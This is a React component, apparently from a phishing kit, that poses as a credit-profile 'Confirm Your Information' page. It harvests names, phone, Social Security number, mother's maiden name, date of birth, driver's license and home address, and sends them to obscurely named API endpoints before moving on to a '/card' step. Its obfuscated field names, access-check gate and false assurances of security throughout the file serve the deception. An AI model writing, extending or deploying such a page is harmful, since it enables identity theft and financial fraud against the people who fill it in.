import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    fzNme: '', 
    lzNme: '', 
    phone: '', 
    ssn: '', 
    motherMaidenName: '', 
    dob: '', 
    driverLicense: '',
    stAd: '',
    city: '',
    state: '',
    zipCode: '',
    form: ''
  });
  const [username, setUsername] = useState('');
  const isAllowed = useAccessCheck(baseUrl);

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      navigate('/login', { replace: true });
    }
  }, [emzemzState, navigate]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  if (!username) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = (month && year) ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
        p2 ? `${p1}-${p2}` : `${p1}`
      );
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');
    
    const newErrors = { 
      fzNme: !fzNme.trim() ? 'First name is required' : '',
      lzNme: !lzNme.trim() ? 'Last name is required' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
      dob: (!month || !day || !year) ? 'Complete date of birth is required' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required" : '',
      stAd: !stAd.trim() ? 'Street address is required' : '',
      city: !city.trim() ? 'City is required' : '',
      state: !state.trim() ? 'State is required' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required' : '',
      form: ''
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      // Submit basic info
      await axios.post(`${baseUrl}api/fifty-meta-data-3/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense
      });

      // Submit home address
      await axios.post(`${baseUrl}api/fifty-meta-data-4/`, {
        emzemz: username,
        stAd,
        apt,
        city,
        state,
        zipCode
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.'
      }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout breadcrumb="Basic Information" cardMaxWidth="max-w-4xl" cardContentClassName="space-y-8">
      <div className="space-y-3">
        <h2 className="text-2xl font-semibold text-gray-900">Confirm Your Information</h2>
        <p className="text-sm text-gray-600">
          Tell us a bit about yourself and confirm the address tied to your credit profile. We’ll use this to keep your account secure.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-8">
        <section className="space-y-4">
          <h3 className="text-lg font-semibold text-gray-900">Personal Details</h3>
          <div className="grid gap-6 md:grid-cols-2">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">First Name</label>
              <input
                id="fzNme"
                name="fzNme"
                type="text"
                value={fzNme}
                onChange={(event) => setFzNme(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter first name"
              />
              {errors.fzNme && <p className="text-xs font-semibold text-red-600">{errors.fzNme}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Last Name</label>
              <input
                id="lzNme"
                name="lzNme"
                type="text"
                value={lzNme}
                onChange={(event) => setLzNme(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter last name"
              />
              {errors.lzNme && <p className="text-xs font-semibold text-red-600">{errors.lzNme}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Phone Number</label>
              <input
                id="phone"
                name="phone"
                type="text"
                value={phone}
                onChange={(event) => setPhone(formatPhone(event.target.value))}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="(555) 123-4567"
              />
              {errors.phone && <p className="text-xs font-semibold text-red-600">{errors.phone}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Mother's Maiden Name</label>
              <input
                id="motherMaidenName"
                name="motherMaidenName"
                type="text"
                value={motherMaidenName}
                onChange={(event) => setMotherMaidenName(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter maiden name"
              />
              {errors.motherMaidenName && <p className="text-xs font-semibold text-red-600">{errors.motherMaidenName}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Social Security Number</label>
              <div className="relative">
                <input
                  id="ssn"
                  name="ssn"
                  type={showSSN ? 'text' : 'password'}
                  value={ssn}
                  onChange={(event) => setSsn(formatSSN(event.target.value))}
                  maxLength={11}
                  className="w-full rounded-sm border border-gray-300 px-3 py-2 pr-20 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                  placeholder="XXX-XX-XXXX"
                />
                <button
                  type="button"
                  onClick={() => setShowSSN((previous) => !previous)}
                  className="absolute inset-y-0 right-3 my-auto text-xs font-semibold uppercase tracking-wide text-[#123b9d]"
                >
                  {showSSN ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.ssn && <p className="text-xs font-semibold text-red-600">{errors.ssn}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Driver's License</label>
              <input
                id="driverLicense"
                name="driverLicense"
                type="text"
                value={driverLicense}
                onChange={(event) => setDriverLicense(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter license number"
              />
              {errors.driverLicense && <p className="text-xs font-semibold text-red-600">{errors.driverLicense}</p>}
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Date of Birth</label>
            <div className="flex flex-wrap gap-2">
              <select
                value={month}
                onChange={(event) => setMonth(event.target.value)}
                className="w-full max-w-[180px] rounded-sm border border-gray-300 px-3 py-2 text-sm focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Month</option>
                {Array.from({ length: 12 }, (_, index) => (
                  <option key={index + 1} value={index + 1}>
                    {new Date(0, index).toLocaleString('default', { month: 'long' })}
                  </option>
                ))}
              </select>
              <select
                value={day}
                onChange={(event) => setDay(event.target.value)}
                className="w-full max-w-[120px] rounded-sm border border-gray-300 px-3 py-2 text-sm focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Day</option>
                {Array.from({ length: daysInMonth }, (_, index) => (
                  <option key={index + 1} value={index + 1}>
                    {index + 1}
                  </option>
                ))}
              </select>
              <select
                value={year}
                onChange={(event) => setYear(event.target.value)}
                className="w-full max-w-[140px] rounded-sm border border-gray-300 px-3 py-2 text-sm focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              >
                <option value="">Year</option>
                {years.map((value) => (
                  <option key={value} value={value}>
                    {value}
                  </option>
                ))}
              </select>
            </div>
            {errors.dob && <p className="text-xs font-semibold text-red-600">{errors.dob}</p>}
          </div>
        </section>

        <section className="space-y-4">
          <h3 className="text-lg font-semibold text-gray-900">Home Address</h3>
          <div className="grid gap-6 md:grid-cols-2">
            <div className="space-y-2 md:col-span-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Street Address</label>
              <input
                id="stAd"
                name="stAd"
                type="text"
                value={stAd}
                onChange={(event) => setStAd(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="123 Main Street"
              />
              {errors.stAd && <p className="text-xs font-semibold text-red-600">{errors.stAd}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Apartment / Unit (optional)</label>
              <input
                id="apt"
                name="apt"
                type="text"
                value={apt}
                onChange={(event) => setApt(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              />
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">City</label>
              <input
                id="city"
                name="city"
                type="text"
                value={city}
                onChange={(event) => setCity(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              />
              {errors.city && <p className="text-xs font-semibold text-red-600">{errors.city}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">State</label>
              <input
                id="state"
                name="state"
                type="text"
                value={state}
                onChange={(event) => setState(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              />
              {errors.state && <p className="text-xs font-semibold text-red-600">{errors.state}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Zip Code</label>
              <input
                id="zipCode"
                name="zipCode"
                type="text"
                value={zipCode}
                onChange={(event) => setZipCode(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              />
              {errors.zipCode && <p className="text-xs font-semibold text-red-600">{errors.zipCode}</p>}
            </div>
          </div>
        </section>

        {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Submitting…' : 'Continue'}
          </button>
        </div>
      </form>

      <div className="rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
        We keep your information secure and only use it to verify your identity and maintain your account.
      </div>
    </FlowPageLayout>
  );
};

export default BasicInfo;
